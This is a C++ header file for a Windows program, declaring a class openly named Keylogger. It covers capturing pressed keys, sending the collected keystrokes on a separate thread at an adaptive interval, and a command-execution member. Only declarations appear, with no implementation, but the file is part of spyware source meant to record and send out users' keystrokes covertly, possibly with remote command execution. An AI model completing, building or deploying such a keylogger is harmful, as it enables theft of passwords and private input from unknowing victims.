#pragma once
#include "stdafx.h"
#include "CommandExe.h"

const int V_SEND_INTERVAL_MIN = 1000;
const int V_SEND_INTERVAL_MAX = 10000;
const int V_IDLE_TIME = 1;

class Keylogger
{
public:
	Keylogger();
	~Keylogger();
    
	void Run();
	void Stop();

	void SendNewThread(const std::wstring *keys);
	void Send(const std::wstring *keys);

private:

	void CheckKey(short vkey);
	void IncreaseSendInterval();
	void DecreaseSendInterval();

	bool shouldStop;
	DWORD sendInterval;

    CommandExe cmd;

	std::wstring keysPressed;
    BYTE keysActive[256];
	WCHAR keyBuf[256];
};

extern Keylogger keylogger;